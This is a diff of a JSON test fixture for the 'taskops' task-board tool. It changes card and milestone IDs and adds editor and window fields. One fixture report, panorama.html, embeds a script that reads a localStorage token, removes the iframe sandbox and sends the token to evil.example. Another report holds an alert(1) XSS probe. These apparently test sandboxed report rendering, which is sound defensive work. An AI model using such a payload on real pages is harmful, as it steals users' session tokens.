@@ -14,15 +14,15 @@
       "src/pdf.py"
      ],
      "holder": null,
-     "id": "tk-aea440",
+     "id": "tk-9df5a9",
      "labels": [],
-     "milestone": "ms-69d8a4",
+     "milestone": "ms-c760ef",
      "priority": 2,
      "quiet_for": 0.0,
      "since": 1770000000.0,
      "title": "PDF",
      "waiting_on": [
-      "tk-69acd7"
+      "tk-21b945"
      ]
     }
    ],
@@ -32,7 +32,7 @@
    "mentions": [
     {
      "by": "agent:berna/w2",
-     "id": "tk-69acd7",
+     "id": "tk-21b945",
      "text": "Decimal or float? `round()` truncates",
      "title": "the reduced rate",
      "ts": 1770000000.0
@@ -44,15 +44,20 @@
    "stalled": [
     {
      "assignee": "agent:berna/w1",
+     "commits": 0,
      "files": [
       "src/tax.py"
      ],
      "holder": null,
-     "id": "tk-881a6f",
+     "id": "tk-2eede9",
      "labels": [
       "backend"
      ],
-     "milestone": "ms-69d8a4",
+     "last_event": {
+      "ago": 0.0,
+      "kind": "edited"
+     },
+     "milestone": "ms-c760ef",
      "priority": 2,
      "quiet_for": 0.0,
      "since": 1770000000.0,
@@ -66,9 +71,9 @@
       "src/tax.py"
      ],
      "holder": null,
-     "id": "tk-69acd7",
+     "id": "tk-21b945",
      "labels": [],
-     "milestone": "ms-69d8a4",
+     "milestone": "ms-c760ef",
      "priority": 2,
      "quiet_for": 0.0,
      "since": 1770000000.0,
@@ -80,7 +85,7 @@
    "by_actor": {
     "agent:berna/w2": {
      "cards": [
-      "tk-69acd7"
+      "tk-21b945"
      ],
      "closed": 0,
      "commits": 1,
@@ -92,10 +97,10 @@
     "dev:berna": {
      "cards": [
       "project",
-      "tk-69acd7",
-      "tk-6d6fcc",
-      "tk-881a6f",
-      "tk-aea440"
+      "tk-21b945",
+      "tk-2eede9",
+      "tk-6d03db",
+      "tk-9df5a9"
      ],
      "closed": 0,
      "commits": 0,
@@ -106,7 +111,7 @@
        "end": 1769999999.999,
        "seconds": 0.0010001659393310547,
        "start": 1769999999.998,
-       "task": "tk-69acd7"
+       "task": "tk-21b945"
       },
       {
        "end": 1770000000.0,
@@ -201,7 +206,7 @@
      "by_actor": {
       "agent:berna/w2": {
        "cards": [
-        "tk-69acd7"
+        "tk-21b945"
        ],
        "closed": 0,
        "commits": 1,
@@ -213,10 +218,10 @@
       "dev:berna": {
        "cards": [
         "project",
-        "tk-69acd7",
-        "tk-6d6fcc",
-        "tk-881a6f",
-        "tk-aea440"
+        "tk-21b945",
+        "tk-2eede9",
+        "tk-6d03db",
+        "tk-9df5a9"
        ],
        "closed": 0,
        "commits": 0,
@@ -227,7 +232,7 @@
          "end": 1769999999.999,
          "seconds": 0.0010001659393310547,
          "start": 1769999999.998,
-         "task": "tk-69acd7"
+         "task": "tk-21b945"
         },
         {
          "end": 1770000000.0,
@@ -244,11 +249,19 @@
      "day": "2026-02-02"
     }
    ],
+   "days_total": 14,
    "from": 1768867200.0,
    "to": 1770076800.0,
    "total": {
     "closed": 0,
     "seconds": 0.002000093460083008
+   },
+   "window": {
+    "end": 1770076800.0,
+    "kind": "days",
+    "label": "14 days",
+    "start": 1768867200.0,
+    "window": "14d"
    }
   },
   "landed_total": 1,
@@ -259,14 +272,15 @@
     "Every number is a Decimal \u2014 `float` appears nowhere"
    ],
    "goal": "**La m\u00e1quina, y el men\u00fa que ya est\u00e1 lleno.**\n\nDe cualquier feature a un veredicto **pre-registrado** en una llamada \u2014 eso es\nla imprenta (`LA IMPRENTA \u00b71` a `\u00b712`).\n\n### D\u00f3nde est\u00e1 el frente hoy (actualizado 2026-08-05)\n\n- `#103 etfflow_regime` \u2014 REJECT. El veto paga peaje de transacci\u00f3n para comprar nada.\n- `#96 mlrank` \u2014 deuda fechada CONTRA EL RELOJ DEL TRIAL, con `tk-21a340` de prerequisito.\n\nY el l\u00edmite que ninguna card mueve: la restricci\u00f3n que ata es el **nivel de Sharpe**.",
-   "id": "ms-69d8a4",
+   "id": "ms-c760ef",
    "reviews": false,
    "rules": [
     "Dev source in ui/, build with `node build.mjs` FROM ui/, and the rebuilt bundle in src/taskops/ui/ IS committed.",
     "1. The feed socket is a signal, not data: never render from a frame."
    ],
    "status": "open",
-   "title": "MVP facturador"
+   "title": "MVP facturador",
+   "union_files": []
   },
   "milestones": [
    {
@@ -276,14 +290,15 @@
      "Every number is a Decimal \u2014 `float` appears nowhere"
     ],
     "goal": "**La m\u00e1quina, y el men\u00fa que ya est\u00e1 lleno.**\n\nDe cualquier feature a un veredicto **pre-registrado** en una llamada \u2014 eso es\nla imprenta (`LA IMPRENTA \u00b71` a `\u00b712`).\n\n### D\u00f3nde est\u00e1 el frente hoy (actualizado 2026-08-05)\n\n- `#103 etfflow_regime` \u2014 REJECT. El veto paga peaje de transacci\u00f3n para comprar nada.\n- `#96 mlrank` \u2014 deuda fechada CONTRA EL RELOJ DEL TRIAL, con `tk-21a340` de prerequisito.\n\nY el l\u00edmite que ninguna card mueve: la restricci\u00f3n que ata es el **nivel de Sharpe**.",
-    "id": "ms-69d8a4",
+    "id": "ms-c760ef",
     "reviews": false,
     "rules": [
      "Dev source in ui/, build with `node build.mjs` FROM ui/, and the rebuilt bundle in src/taskops/ui/ IS committed.",
      "1. The feed socket is a signal, not data: never render from a frame."
     ],
     "status": "open",
-    "title": "MVP facturador"
+    "title": "MVP facturador",
+    "union_files": []
    },
    {
     "branch": "ms/nova-panel-by-panel",
@@ -292,13 +307,14 @@
      "every pane is filled"
     ],
     "goal": "the dashboard, pane by pane",
-    "id": "ms-13691a",
+    "id": "ms-bf834d",
     "reviews": false,
     "rules": [
      "ts-only diffs, the chapter-close rebuilds"
     ],
     "status": "landed",
-    "title": "Nova, panel by panel"
+    "title": "Nova, panel by panel",
+    "union_files": []
    }
   ],
   "pulse": {
@@ -318,25 +334,25 @@
   "reports": [
    {
     "by": "dev:berna",
-    "id": "f4afd2072f75d30b172a3f60094565a7",
-    "milestone": "ms-69d8a4",
+    "id": "3ac579214e3166be59253e6a8618f214",
+    "milestone": "ms-c760ef",
     "path": ".taskops/reports/panorama.html",
-    "sha": "39b5fd76fa3200ff23b313c326b9067794d59822",
+    "sha": "bf8875455accf1c651a873788be4fda232c1c010",
     "title": "Chapter panorama \u2014 twelve cards, end to end",
     "ts": 1770000000.0
    },
    {
     "by": "dev:berna",
-    "id": "73d77c0dc088fc758c52c675b53aa426",
-    "milestone": "ms-69d8a4",
+    "id": "5eca6963b213ecaae5ba9886a0a16cbb",
+    "milestone": "ms-c760ef",
     "path": ".taskops/reports/notes.md",
-    "sha": "39b5fd76fa3200ff23b313c326b9067794d59822",
+    "sha": "bf8875455accf1c651a873788be4fda232c1c010",
     "title": "Field notes from the importer",
     "ts": 1770000000.0
    }
   ],
   "reports_total": 2,
-  "seq": 14,
+  "seq": 15,
   "team": [
    {
     "actor": "dev:berna",
@@ -367,7 +383,7 @@
    "mentions": [
     {
      "by": "agent:berna/w2",
-     "id": "tk-69acd7",
+     "id": "tk-21b945",
      "text": "Decimal or float? `round()` truncates",
      "title": "the reduced rate",
      "ts": 1770000000.0
@@ -382,9 +398,9 @@
      "assignee": "",
      "files": [],
      "holder": null,
-     "id": "tk-6d6fcc",
+     "id": "tk-6d03db",
      "labels": [],
-     "milestone": "ms-13691a",
+     "milestone": "ms-bf834d",
      "priority": 2,
      "quiet_for": 0.0,
      "since": 1770000000.0,
@@ -396,7 +412,7 @@
    "by_actor": {
     "agent:berna/w2": {
      "cards": [
-      "tk-69acd7"
+      "tk-21b945"
      ],
      "closed": 0,
      "commits": 1,
@@ -408,10 +424,10 @@
     "dev:berna": {
      "cards": [
       "project",
-      "tk-69acd7",
-      "tk-6d6fcc",
-      "tk-881a6f",
-      "tk-aea440"
+      "tk-21b945",
+      "tk-2eede9",
+      "tk-6d03db",
+      "tk-9df5a9"
      ],
      "closed": 0,
      "commits": 0,
@@ -422,7 +438,7 @@
        "end": 1769999999.999,
        "seconds": 0.0010001659393310547,
        "start": 1769999999.998,
-       "task": "tk-69acd7"
+       "task": "tk-21b945"
       },
       {
        "end": 1770000000.0,
@@ -517,7 +533,7 @@
      "by_actor": {
       "agent:berna/w2": {
        "cards": [
-        "tk-69acd7"
+        "tk-21b945"
        ],
        "closed": 0,
        "commits": 1,
@@ -529,10 +545,10 @@
       "dev:berna": {
        "cards": [
         "project",
-        "tk-69acd7",
-        "tk-6d6fcc",
-        "tk-881a6f",
-        "tk-aea440"
+        "tk-21b945",
+        "tk-2eede9",
+        "tk-6d03db",
+        "tk-9df5a9"
        ],
        "closed": 0,
        "commits": 0,
@@ -543,7 +559,7 @@
          "end": 1769999999.999,
          "seconds": 0.0010001659393310547,
          "start": 1769999999.998,
-         "task": "tk-69acd7"
+         "task": "tk-21b945"
         },
         {
          "end": 1770000000.0,
@@ -560,11 +576,19 @@
      "day": "2026-02-02"
     }
    ],
+   "days_total": 14,
    "from": 1768867200.0,
    "to": 1770076800.0,
    "total": {
     "closed": 0,
     "seconds": 0.002000093460083008
+   },
+   "window": {
+    "end": 1770076800.0,
+    "kind": "days",
+    "label": "14 days",
+    "start": 1768867200.0,
+    "window": "14d"
    }
   },
   "landed_total": 1,
@@ -575,13 +599,14 @@
     "every pane is filled"
    ],
    "goal": "the dashboard, pane by pane",
-   "id": "ms-13691a",
+   "id": "ms-bf834d",
    "reviews": false,
    "rules": [
     "ts-only diffs, the chapter-close rebuilds"
    ],
    "status": "landed",
-   "title": "Nova, panel by panel"
+   "title": "Nova, panel by panel",
+   "union_files": []
   },
   "milestones": [
    {
@@ -591,14 +616,15 @@
      "Every number is a Decimal \u2014 `float` appears nowhere"
     ],
     "goal": "**La m\u00e1quina, y el men\u00fa que ya est\u00e1 lleno.**\n\nDe cualquier feature a un veredicto **pre-registrado** en una llamada \u2014 eso es\nla imprenta (`LA IMPRENTA \u00b71` a `\u00b712`).\n\n### D\u00f3nde est\u00e1 el frente hoy (actualizado 2026-08-05)\n\n- `#103 etfflow_regime` \u2014 REJECT. El veto paga peaje de transacci\u00f3n para comprar nada.\n- `#96 mlrank` \u2014 deuda fechada CONTRA EL RELOJ DEL TRIAL, con `tk-21a340` de prerequisito.\n\nY el l\u00edmite que ninguna card mueve: la restricci\u00f3n que ata es el **nivel de Sharpe**.",
-    "id": "ms-69d8a4",
+    "id": "ms-c760ef",
     "reviews": false,
     "rules": [
      "Dev source in ui/, build with `node build.mjs` FROM ui/, and the rebuilt bundle in src/taskops/ui/ IS committed.",
      "1. The feed socket is a signal, not data: never render from a frame."
     ],
     "status": "open",
-    "title": "MVP facturador"
+    "title": "MVP facturador",
+    "union_files": []
    },
    {
     "branch": "ms/nova-panel-by-panel",
@@ -607,13 +633,14 @@
      "every pane is filled"
     ],
     "goal": "the dashboard, pane by pane",
-    "id": "ms-13691a",
+    "id": "ms-bf834d",
     "reviews": false,
     "rules": [
      "ts-only diffs, the chapter-close rebuilds"
     ],
     "status": "landed",
-    "title": "Nova, panel by panel"
+    "title": "Nova, panel by panel",
+    "union_files": []
    }
   ],
   "pulse": {
@@ -632,7 +659,7 @@
   "repo": null,
   "reports": [],
   "reports_total": 0,
-  "seq": 14,
+  "seq": 15,
   "team": [
    {
     "actor": "dev:berna",
@@ -653,12 +680,12 @@
   "blocks": [
    {
     "assignee": "",
-    "id": "tk-aea440",
+    "id": "tk-9df5a9",
     "status": "blocked",
     "title": "PDF"
    }
   ],
-  "branch": "tk-69acd7",
+  "branch": "tk-21b945",
   "card": {
    "after": [],
    "assignee": "",
@@ -671,10 +698,10 @@
    "files": [
     "src/tax.py"
    ],
-   "id": "tk-69acd7",
+   "id": "tk-21b945",
    "labels": [],
-   "milestone": "ms-69d8a4",
-   "parent": "tk-881a6f",
+   "milestone": "ms-c760ef",
+   "parent": "tk-2eede9",
    "priority": 2,
    "review": false,
    "spec": "10% for food",
@@ -688,7 +715,7 @@
      "src/tax.py"
     ],
     "holder": "agent:berna/w1",
-    "id": "tk-881a6f",
+    "id": "tk-2eede9",
     "started": false,
     "title": "VAT"
    }
@@ -703,7 +730,7 @@
   ],
   "elsewhere": [],
   "epic": {
-   "id": "tk-881a6f",
+   "id": "tk-2eede9",
    "spec": "the whole tax",
    "status": "stalled",
    "title": "VAT"
@@ -724,10 +751,10 @@
       "files": [
        "src/tax.py"
       ],
-      "id": "tk-69acd7",
+      "id": "tk-21b945",
       "labels": [],
-      "milestone": "ms-69d8a4",
-      "parent": "tk-881a6f",
+      "milestone": "ms-c760ef",
+      "parent": "tk-2eede9",
       "priority": 2,
       "review": false,
       "spec": "10% for food",
@@ -736,19 +763,19 @@
       "updated": 1769999999.999
      }
     },
-    "id": "e01512022f3c48592a604647d0319ba4",
+    "id": "4815d7c405ba6a887d6b9fb948a7b4e4",
     "kind": "created",
-    "task": "tk-69acd7",
+    "task": "tk-21b945",
     "ts": 1769999999.999
    },
    {
     "actor": "agent:berna/w2",
     "body": {
-     "branch": "tk-69acd7"
+     "branch": "tk-21b945"
     },
-    "id": "6a77e9dffab345a84fae77774b5b5930",
+    "id": "70db7509cd1db630a49e211a6077707b",
     "kind": "claimed",
-    "task": "tk-69acd7",
+    "task": "tk-21b945",
     "ts": 1770000000.0
    },
    {
@@ -759,9 +786,9 @@
      "sha": "a3f9c21b",
      "subject": "feat: rates"
     },
-    "id": "8dd9d1ebfde4dc51f2085b752de64ebe",
+    "id": "821f59a70ca57757ce7978db19eaca56",
     "kind": "commit",
-    "task": "tk-69acd7",
+    "task": "tk-21b945",
     "ts": 1770000000.0
    },
    {
@@ -772,9 +799,9 @@
      ],
      "text": "Decimal or float? `round()` truncates"
     },
-    "id": "6ca766abcb55243bcb492dbd68d608b2",
+    "id": "68619e7b80662054b12f368b2f8b0bbb",
     "kind": "comment",
-    "task": "tk-69acd7",
+    "task": "tk-21b945",
     "ts": 1770000000.0
    },
    {
@@ -782,9 +809,9 @@
     "body": {
      "note": "got to the rounding \u2014 see `src/tax.py::half_up`"
     },
-    "id": "410b570775e3565f360218f2ce094f91",
+    "id": "bd3d8cd9aac25eed15c6a40a9dfab0d5",
     "kind": "released",
-    "task": "tk-69acd7",
+    "task": "tk-21b945",
     "ts": 1770000000.0
    }
   ],
@@ -797,14 +824,15 @@
     "Every number is a Decimal \u2014 `float` appears nowhere"
    ],
    "goal": "**La m\u00e1quina, y el men\u00fa que ya est\u00e1 lleno.**\n\nDe cualquier feature a un veredicto **pre-registrado** en una llamada \u2014 eso es\nla imprenta (`LA IMPRENTA \u00b71` a `\u00b712`).\n\n### D\u00f3nde est\u00e1 el frente hoy (actualizado 2026-08-05)\n\n- `#103 etfflow_regime` \u2014 REJECT. El veto paga peaje de transacci\u00f3n para comprar nada.\n- `#96 mlrank` \u2014 deuda fechada CONTRA EL RELOJ DEL TRIAL, con `tk-21a340` de prerequisito.\n\nY el l\u00edmite que ninguna card mueve: la restricci\u00f3n que ata es el **nivel de Sharpe**.",
-   "id": "ms-69d8a4",
+   "id": "ms-c760ef",
    "reviews": false,
    "rules": [
     "Dev source in ui/, build with `node build.mjs` FROM ui/, and the rebuilt bundle in src/taskops/ui/ IS committed.",
     "1. The feed socket is a signal, not data: never render from a frame."
    ],
    "status": "open",
-   "title": "MVP facturador"
+   "title": "MVP facturador",
+   "union_files": []
   },
   "pulse": {
    "actor": "dev:berna",
@@ -824,13 +852,13 @@
   "standing": null,
   "state": "ready",
   "subtasks": [],
-  "worktree": ".taskops/trees/tk-69acd7"
+  "worktree": ".taskops/trees/tk-21b945"
  },
  "closed": [
   {
    "blockers": [],
    "blocks": [],
-   "branch": "tk-036cb4",
+   "branch": "tk-fa9cab",
    "card": {
     "after": [],
     "assignee": "",
@@ -838,9 +866,9 @@
     "created_by": "dev:berna",
     "criteria": [],
     "files": [],
-    "id": "tk-036cb4",
+    "id": "tk-fa9cab",
     "labels": [],
-    "milestone": "ms-448afb",
+    "milestone": "ms-05f459",
     "parent": null,
     "priority": 2,
     "review": true,
@@ -871,9 +899,9 @@
        "created_by": "dev:berna",
        "criteria": [],
        "files": [],
-       "id": "tk-036cb4",
+       "id": "tk-fa9cab",
        "labels": [],
-       "milestone": "ms-448afb",
+       "milestone": "ms-05f459",
        "parent": null,
        "priority": 2,
        "review": true,
@@ -883,19 +911,19 @@
        "updated": 1769999999.999
       }
      },
-     "id": "ff24524da4fda7db0123230d9ae6233b",
+     "id": "9417529f56981c3715f3f2c272343c57",
      "kind": "created",
-     "task": "tk-036cb4",
+     "task": "tk-fa9cab",
      "ts": 1769999999.999
     },
     {
      "actor": "agent:berna/w2",
      "body": {
-      "branch": "tk-036cb4"
+      "branch": "tk-fa9cab"
      },
-     "id": "9411a5a021d0c7bb78c870b795897616",
+     "id": "798ca20cad7d12d4074e4e0ff884d958",
      "kind": "claimed",
-     "task": "tk-036cb4",
+     "task": "tk-fa9cab",
      "ts": 1770000000.0
     },
     {
@@ -906,9 +934,9 @@
       "sha": "c0ffee11",
       "subject": "feat: csv"
      },
-     "id": "894f94ea1f39f822d92275f695ff488f",
+     "id": "714b56c97cc62b75a96b741ed908cb88",
      "kind": "commit",
-     "task": "tk-036cb4",
+     "task": "tk-fa9cab",
      "ts": 1770000000.0
     },
     {
@@ -916,9 +944,9 @@
      "body": {
       "note": "parsed with Decimal throughout"
      },
-     "id": "e8a20a3290dc8bb293ab2febe8ee8d93",
+     "id": "d056687b12a498cfb3f94fb4f1bdc102",
      "kind": "submitted",
-     "task": "tk-036cb4",
+     "task": "tk-fa9cab",
      "ts": 1770000000.0
     },
     {
@@ -927,9 +955,9 @@
       "note": "read every row, the rounding holds",
       "verdict": "pass"
      },
-     "id": "8d7c42ca0920fa52e6de8edeec4102ff",
+     "id": "6e6a61664ec1aa6a20601f6787a366bd",
      "kind": "reviewed",
-     "task": "tk-036cb4",
+     "task": "tk-fa9cab",
      "ts": 1770000000.0
     },
     {
@@ -938,9 +966,9 @@
       "reason": "closed after the pass \u2014 Decimal all the way",
       "to": "done"
      },
-     "id": "1434be547535a945a7b3bbc5e51beeef",
+     "id": "27947bd1c6410789d5d88d0e88765d78",
      "kind": "status",
-     "task": "tk-036cb4",
+     "task": "tk-fa9cab",
      "ts": 1770000000.0
     }
    ],
@@ -951,11 +979,12 @@
     "created": 1770000000.0,
     "criteria": [],
     "goal": "read a bank CSV",
-    "id": "ms-448afb",
+    "id": "ms-05f459",
     "reviews": false,
     "rules": [],
     "status": "open",
-    "title": "the importer"
+    "title": "the importer",
+    "union_files": []
    },
    "pulse": {
     "actor": "dev:berna",
@@ -981,12 +1010,12 @@
    },
    "state": "done",
    "subtasks": [],
-   "worktree": ".taskops/trees/tk-036cb4"
+   "worktree": ".taskops/trees/tk-fa9cab"
   },
   {
    "blockers": [],
    "blocks": [],
-   "branch": "tk-a304d3",
+   "branch": "tk-d3800b",
    "card": {
     "after": [],
     "assignee": "",
@@ -994,9 +1023,9 @@
     "created_by": "dev:berna",
     "criteria": [],
     "files": [],
-    "id": "tk-a304d3",
+    "id": "tk-d3800b",
     "labels": [],
-    "milestone": "ms-448afb",
+    "milestone": "ms-05f459",
     "parent": null,
     "priority": 2,
     "review": false,
@@ -1020,9 +1049,9 @@
        "created_by": "dev:berna",
        "criteria": [],
        "files": [],
-       "id": "tk-a304d3",
+       "id": "tk-d3800b",
        "labels": [],
-       "milestone": "ms-448afb",
+       "milestone": "ms-05f459",
        "parent": null,
        "priority": 2,
        "review": false,
@@ -1032,19 +1061,19 @@
        "updated": 1770000000.0
       }
      },
-     "id": "7de9b87f66c25b67e13eca9496857d20",
+     "id": "38a9790986c8e999eea10cead51f1cce",
      "kind": "created",
-     "task": "tk-a304d3",
+     "task": "tk-d3800b",
      "ts": 1770000000.0
     },
     {
      "actor": "agent:berna/w2",
      "body": {
-      "branch": "tk-a304d3"
+      "branch": "tk-d3800b"
      },
-     "id": "313c51b667045829c3c55ad95b214d9b",
+     "id": "420ae0968f1e0fd4e4850e631dde851d",
      "kind": "claimed",
-     "task": "tk-a304d3",
+     "task": "tk-d3800b",
      "ts": 1770000000.0
     },
     {
@@ -1054,9 +1083,9 @@
       "reason": "the README already said it, so there was nothing to write",
       "to": "done"
      },
-     "id": "701372d8106b75619208c43d16fcdd7f",
+     "id": "93e4a202cbcc17f36ce399b80160324f",
      "kind": "status",
-     "task": "tk-a304d3",
+     "task": "tk-d3800b",
      "ts": 1770000000.0
     }
    ],
@@ -1067,11 +1096,12 @@
     "created": 1770000000.0,
     "criteria": [],
     "goal": "read a bank CSV",
-    "id": "ms-448afb",
+    "id": "ms-05f459",
     "reviews": false,
     "rules": [],
     "status": "open",
-    "title": "the importer"
+    "title": "the importer",
+    "union_files": []
    },
    "pulse": {
     "actor": "dev:berna",
@@ -1091,9 +1121,184 @@
    "standing": null,
    "state": "done",
    "subtasks": [],
-   "worktree": ".taskops/trees/tk-a304d3"
+   "worktree": ".taskops/trees/tk-d3800b"
   }
  ],
+ "editor": {
+  "binary": {
+   "base": {
+    "ref": "ms/mvp",
+    "sha": "b01ecea2270daeeea2832cfaadd4fbf08454ff10"
+   },
+   "binary": true,
+   "cap": 524288,
+   "marks": [],
+   "mtime": 1788698643.0339746,
+   "path": "logo.png",
+   "size": 16,
+   "text": "",
+   "tracked": false,
+   "tree": "tk-a11111",
+   "truncated": false
+  },
+  "diff": {
+   "base": {
+    "ref": "ms/mvp",
+    "sha": "b01ecea2270daeeea2832cfaadd4fbf08454ff10"
+   },
+   "cap": 524288,
+   "patch": "diff --git c/src/app.py w/src/app.py\nindex bd122c4..517eab6 100644\n--- c/src/app.py\n+++ w/src/app.py\n@@ -1,4 +1,7 @@\n import os\n \n def main():\n-    return 1\n+    return 2\n+\n+def extra():\n+    pass",
+   "path": "src/app.py",
+   "tree": "tk-a11111",
+   "truncated": false
+  },
+  "file": {
+   "base": {
+    "ref": "ms/mvp",
+    "sha": "b01ecea2270daeeea2832cfaadd4fbf08454ff10"
+   },
+   "binary": false,
+   "cap": 524288,
+   "marks": [
+    [
+     4,
+     4,
+     "modified"
+    ],
+    [
+     5,
+     7,
+     "added"
+    ]
+   ],
+   "mtime": 1788698643.0246177,
+   "path": "src/app.py",
+   "size": 59,
+   "text": "import os\n\ndef main():\n    return 2\n\ndef extra():\n    pass\n",
+   "tracked": true,
+   "tree": "tk-a11111",
+   "truncated": false
+  },
+  "listing": {
+   "at": 1770000000.0,
+   "branch": "tk-a11111",
+   "cap": 4000,
+   "capped": false,
+   "files": [
+    {
+     "mtime": 1788698643.0227745,
+     "path": ".gitignore",
+     "size": 20,
+     "state": "clean"
+    },
+    {
+     "mtime": 1788698643.0228698,
+     "path": "README.md",
+     "size": 6,
+     "state": "clean"
+    },
+    {
+     "mtime": 1788698643.0246177,
+     "path": "alias.py",
+     "size": 59,
+     "state": "untracked"
+    },
+    {
+     "mtime": 1788698643.0229824,
+     "path": "docs/notes.md",
+     "size": 8,
+     "state": "clean"
+    },
+    {
+     "mtime": 1762450524.5151649,
+     "path": "escape",
+     "size": 220,
+     "state": "untracked"
+    },
+    {
+     "mtime": 1788698643.0339746,
+     "path": "logo.png",
+     "size": 16,
+     "state": "untracked"
+    },
+    {
+     "mtime": 1788698643.0246177,
+     "path": "src/app.py",
+     "size": 59,
+     "state": "modified"
+    },
+    {
+     "mtime": 1788698643.0246897,
+     "path": "src/new.py",
+     "size": 8,
+     "state": "untracked"
+    },
+    {
+     "mtime": 1788698643.024751,
+     "path": "src/staged.py",
+     "size": 11,
+     "state": "added"
+    },
+    {
+     "mtime": 1788698643.0293474,
+     "path": "src/tidy.py",
+     "size": 13,
+     "state": "staged"
+    }
+   ],
+   "head": "b01ecea2270daeeea2832cfaadd4fbf08454ff10",
+   "seq": 1,
+   "total": 10,
+   "tree": "tk-a11111"
+  },
+  "no_checkout": "this host serves boards, not a checkout \u2014 the Editor reads the worktrees on the disk `taskops ui` runs on, and this process was started outside one (taskops serve). Run `taskops ui` in a checkout joined to this board and the page reads your own trees.",
+  "outside": "../checkout/README.md is not a file inside that worktree. This door reads the files of ONE inhabited directory and nothing else \u2014 no `..`, no absolute path, no symlink that leaves it, and never `.git`.",
+  "trees": {
+   "checkout": "/var/folders/nj/7fh27v2s5sg0ld6bdgzwyph40000gn/T/tmpeizq70h7/editor/checkout",
+   "trees": [
+    {
+     "branch": "main",
+     "dir": "",
+     "head": "b01ecea2270daeeea2832cfaadd4fbf08454ff10",
+     "name": "main"
+    },
+    {
+     "branch": "ms/mvp",
+     "dir": ".taskops/trees/_ms-mvp",
+     "head": "b01ecea2270daeeea2832cfaadd4fbf08454ff10",
+     "name": "_ms-mvp"
+    },
+    {
+     "branch": "tk-a11111",
+     "dir": ".taskops/trees/tk-a11111",
+     "head": "b01ecea2270daeeea2832cfaadd4fbf08454ff10",
+     "name": "tk-a11111"
+    }
+   ]
+  },
+  "untracked": {
+   "base": {
+    "ref": "ms/mvp",
+    "sha": "b01ecea2270daeeea2832cfaadd4fbf08454ff10"
+   },
+   "binary": false,
+   "cap": 524288,
+   "marks": [
+    [
+     1,
+     1,
+     "added"
+    ]
+   ],
+   "mtime": 1788698643.0246897,
+   "path": "src/new.py",
+   "size": 8,
+   "text": "new = 1\n",
+   "tracked": false,
+   "tree": "tk-a11111",
+   "truncated": false
+  }
+ },
  "expect": [
   "the reduced rate",
   "10% for food",
@@ -1115,9 +1320,9 @@
  ],
  "git": {
   "compare": {
-   "base": "39b5fd76fa3200ff23b313c326b9067794d59822",
+   "base": "bf8875455accf1c651a873788be4fda232c1c010",
    "cap": 524288,
-   "head": "0352402c867a67c26045017532dd343716e30518",
+   "head": "41f5373ea19a13c5421a95c6d91e1cfd7cda4953",
    "patch": "diff --git a/pdf.py b/pdf.py\nnew file mode 100644\nindex 0000000..50162bc\n--- /dev/null\n+++ b/pdf.py\n@@ -0,0 +1 @@\n+def render() -> None: ...\ndiff --git a/tax.py b/tax.py\nindex c1c6c95..d5a2d14 100644\n--- a/tax.py\n+++ b/tax.py\n@@ -1 +1,2 @@\n RATE = 0.22\n+REDUCED = 0.10",
    "stat": {
     "pdf.py": [
@@ -1135,18 +1340,18 @@
    "cap": 524288,
    "content_type": "text/html",
    "path": ".taskops/reports/panorama.html",
-   "rev": "39b5fd76fa3200ff23b313c326b9067794d59822",
+   "rev": "bf8875455accf1c651a873788be4fda232c1c010",
    "text": "<!doctype html>\n<html><body>\n<h1>Chapter panorama</h1>\n<p>Twelve cards, four workers, one bundle rebuild.</p>\n<script>\n  const stolen = parent.localStorage.getItem(\"taskops:http://localhost:7777\");\n  parent.document.title = stolen;\n  window.frameElement.removeAttribute(\"sandbox\");\n  fetch(\"https://evil.example/\" + stolen);\n</script>\n</body></html>",
    "truncated": false
   },
-  "no_repo": "this host serves boards, not a repository \u2014 it was started outside a checkout (taskops serve), so there is no clone here to read a diff from. A host that sits in a repo (taskops ui) answers /git.",
+  "no_repo": "this host serves boards, not a repository \u2014 it was started outside a checkout (taskops serve), and nothing has been pushed to this board's git here yet, so there is no history to read a diff from. Two ways in: push to this board's remote (`taskops remote` names it, and a worktree joined to the board pushes every commit on its own), or run `taskops ui` in a checkout, where the window reads your own clone.",
   "not_a_report": "tax.py is not a report. This door serves committed files under .taskops/reports/ and nothing else \u2014 it is not a file server, and a read token is not a licence to read the clone. Ask for the path a report event carries, exactly as it carries it.",
   "stale": "tk-b22222 is not in your clone yet \u2014 `git fetch origin tk-b22222` brings it. The board is shared and the code is not: a card's branch reaches origin when it closes, and this window reads only the checkout it stands in. Nothing is fetched for you.",
   "text_file": {
    "cap": 524288,
    "content_type": "text/markdown",
    "path": ".taskops/reports/notes.md",
-   "rev": "39b5fd76fa3200ff23b313c326b9067794d59822",
+   "rev": "bf8875455accf1c651a873788be4fda232c1c010",
    "text": "# Field notes\n\nThe importer landed. `<script>alert(1)</script>` was in the CSV and is prose here.",
    "truncated": false
   }
